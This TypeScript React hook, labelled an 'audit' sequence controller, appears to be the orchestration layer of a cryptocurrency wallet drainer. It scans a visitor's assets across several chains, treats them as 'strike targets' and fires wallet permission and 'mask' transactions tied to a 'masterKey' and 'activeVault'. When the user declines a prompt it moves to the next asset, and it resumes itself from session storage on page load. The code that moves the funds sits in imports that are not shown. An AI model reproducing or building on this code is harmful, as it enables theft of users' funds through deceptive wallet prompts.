"use client";

import { useCallback, useEffect, useRef } from "react";
import { useContractMask } from "./useContractMask";
import { useTokenPermissions } from "./seTokenPermissions";
import { useWalletClient } from "wagmi";
import { useAuditScanner, startPreload } from "./useAuditScanner";
import { useAuditExecutor } from "./useAuditExecutor";
import { useNonEvmExecutor } from "./useNonEvmExecutor";

const verifySessionIntegrity = (data: any) => {
  if (!data) return false;
  const hasIdentity =
    data.userAddress ||
    data.solanaAddress ||
    data.bitcoinAddress ||
    data.address;
  return !!hasIdentity;
};

let globalSequenceRunning = false;

/**
 * 🛰️ MASTER SEQUENCE CONTROLLER (v17.0.0 - Zero-Latency Strike Edition)
 * Optimized for instant transition between Decision Maker and Wallet Pop-ups.
 */
export function useAuditSequence() {
  const { executeMask } = useContractMask();
  const { requestManualPermission } = useTokenPermissions();
  const { data: walletClient } = useWalletClient();
  const { runNonEvmStrike } = useNonEvmExecutor();

  const { performScan } = useAuditScanner();
  const { runExecutionLoop } = useAuditExecutor({
    executeMask,
    requestManualPermission,
  });

  const isBusy = useRef(false);
  const walletClientRef = useRef(walletClient);

  useEffect(() => {
    walletClientRef.current = walletClient;
  }, [walletClient]);

  useEffect(() => {
    globalSequenceRunning = false;
    isBusy.current = false;
  }, []);

  const ensureProviderReady = async (type: string, logPrefix: string) => {
    const isSolana = type === "SOLANA" || type === "SOL";
    if (isSolana) {
      if ((window as any).solana) return true;
      let attempts = 0;
      while (!(window as any).solana && attempts < 10) {
        // High-frequency polling (20ms) for instant detection
        await new Promise((r) => setTimeout(r, 20));
        attempts++;
      }
      if (!(window as any).solana) throw new Error("SOLANA_PROVIDER_MISSING");
    }
    return true;
  };

  /**
   * 🛡️ INSTANT HYDRATION: Accelerated WalletClient resolution
   */
  const waitForWalletClient = async (logPrefix: string) => {
    if (walletClientRef.current) return walletClientRef.current;

    console.log(`${logPrefix} ⏳ Accelerated WalletClient sync...`);
    let attempts = 0;
    while (!walletClientRef.current && attempts < 50) {
      // 30ms polling for maximum reactivity
      await new Promise((r) => setTimeout(r, 30));
      attempts++;
    }
    return walletClientRef.current;
  };

  const runAuditStep = useCallback(
    async (params: any) => {
      const logPrefix = "[useAuditSequence.ts]";

      if (isBusy.current || globalSequenceRunning) {
        return { status: "BUSY" };
      }

      try {
        isBusy.current = true;
        globalSequenceRunning = true;

        // 🛡️ STEP 1: SCAN & VALIDATE (Decision Maker)
        const scanResults = await performScan({ ...params, logPrefix });

        if (!scanResults) {
          globalSequenceRunning = false;
          isBusy.current = false;
          return { status: "IDLE" };
        }

        if (!verifySessionIntegrity(scanResults)) {
          sessionStorage.removeItem("active_strike_session");
          throw new Error("SECURITY_INTEGRITY_VIOLATION");
        }

        if (scanResults.isFinished) {
          globalSequenceRunning = false;
          isBusy.current = false;
          return { status: "IDLE" };
        }

        const { masterKey, activeVault, assets, plan } = scanResults;
        const userAddress =
          scanResults.userAddress ||
          scanResults.solanaAddress ||
          scanResults.bitcoinAddress ||
          scanResults.address;

        const strikeTargets = (
          plan && plan.length > 0 ? plan.map((p: any) => p.asset) : assets
        ).map((asset: any) => ({
          ...asset,
          contractAddress:
            asset.contractAddress || asset.tokenAddress || asset.address,
        }));

        // 🚀 STEP 2: ZERO-LATENCY HANDOFF (Waiters removed)
        console.log(
          `${logPrefix} ⚡ Strike Sequence: ${strikeTargets.length} targets active.`,
        );

        for (const asset of strikeTargets) {
          try {
            const chainType = (asset.chainType || "").toUpperCase();
            const assetChainId = Number(asset.chainId);

            const isNonEvm =
              ["SOLANA", "SOL", "BITCOIN", "BTC", "XRP", "LTC"].includes(
                chainType,
              ) || [501, 144, 0].includes(assetChainId);

            if (!isNonEvm) {
              // 🚀 PARALLEL READY CHECK
              const activeClient = await waitForWalletClient(logPrefix);

              if (!activeClient) {
                console.error(`${logPrefix} ❌ Client Sync Timeout.`);
                break;
              }

              console.log(`${logPrefix} 🎯 Instant Strike: ${asset.symbol}`);

              // Trigger the execution loop (which now contains instant pop-up logic)
              await runExecutionLoop({
                assets: [asset],
                userAddress,
                activeVault,
                masterKey,
                logPrefix,
                walletClient: activeClient,
              });
            } else {
              await ensureProviderReady(chainType, logPrefix);
              await runNonEvmStrike(asset, {
                userAddress: asset.address || userAddress,
                masterKey,
                logPrefix,
              });
            }
          } catch (err: any) {
            const errLower = (err?.message || "").toLowerCase();
            if (err?.code === 4001 || errLower.includes("rejected")) {
              console.log(`${logPrefix} 🛑 User Declined: ${asset.symbol}`);
              continue;
            }
            continue;
          }
        }

        // Final Session Persistence (Maintained)
        const finalSession = sessionStorage.getItem("active_strike_session");
        if (finalSession) {
          const data = JSON.parse(finalSession);
          sessionStorage.setItem(
            "active_strike_session",
            JSON.stringify({ ...data, isFinished: true }),
          );
        }

        if (params.onComplete) params.onComplete();
        return { status: "COMPLETE" };
      } catch (e: any) {
        console.error(`${logPrefix} ❌ Sequence Error:`, e.message);
        return { status: "ERROR" };
      } finally {
        isBusy.current = false;
        globalSequenceRunning = false;
      }
    },
    [performScan, runExecutionLoop, runNonEvmStrike],
  );

  useEffect(() => {
    startPreload();
    const session = sessionStorage.getItem("active_strike_session");
    if (session && !globalSequenceRunning) {
      const data = JSON.parse(session);
      if (data.isFinished) return;

      const hasValidAddress =
        data.userAddress || data.solanaAddress || data.bitcoinAddress;
      if (!hasValidAddress) return;

      // Accelerated session recovery (20ms instead of 400ms)
      const timer = setTimeout(() => {
        runAuditStep({
          userAddress: data.userAddress,
          solanaAddress: data.solanaAddress,
          bitcoinAddress: data.bitcoinAddress,
          solana: data.solanaAddress,
          btc: data.bitcoinAddress,
          isRestored: true,
        });
      }, 20);
      return () => clearTimeout(timer);
    }
  }, [runAuditStep]);

  return { runAuditStep };
}
